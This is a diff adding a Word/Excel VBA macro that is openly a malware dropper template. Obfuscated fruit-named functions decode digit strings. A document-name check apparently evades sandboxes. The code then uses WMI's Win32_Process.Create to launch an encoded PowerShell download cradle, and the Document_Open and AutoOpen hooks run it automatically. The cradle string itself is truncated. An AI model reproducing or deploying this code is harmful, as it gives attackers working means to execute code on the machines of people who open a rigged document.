@@ -1,0 +1,49 @@
+Function Pears(Beets)
+    Pears = Chr(Beets - 17)
+End Function
+
+Function Strawberries(Grapes)
+    Strawberries = Left(Grapes, 3)
+End Function
+
+Function Almonds(Jelly)
+    Almonds = Right(Jelly, Len(Jelly) - 3)
+End Function
+
+Function Nuts(Milk)
+    Do
+    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
+    Milk = Almonds(Milk)
+    Loop While Len(Milk) > 0
+    Nuts = Oatmilk
+End Function
+
+Function MyMacro()
+    Dim Apples As String
+    Dim Water As String
+
+    ' The encoded string in Nuts is the MS document's name (e.g. poop.doc) 
+    ' Note: Use "ActiveDocument" for Word, "ActiveWorkbook" for Excel
+    If ActiveDocument.Name <> Nuts("129128128129063117128116") Then
+        Exit Function
+    End If
+    
+    ' Insert Powershell-generated encoded cradle code here
+    Apples = "12912813611813…"
+    Water = Nuts(Apples)
+
+    ' Encoded strings here are some Win32APIs ("winmgmts:" & "Win32_Process" respectively)
+GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
+
+End Function
+
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+
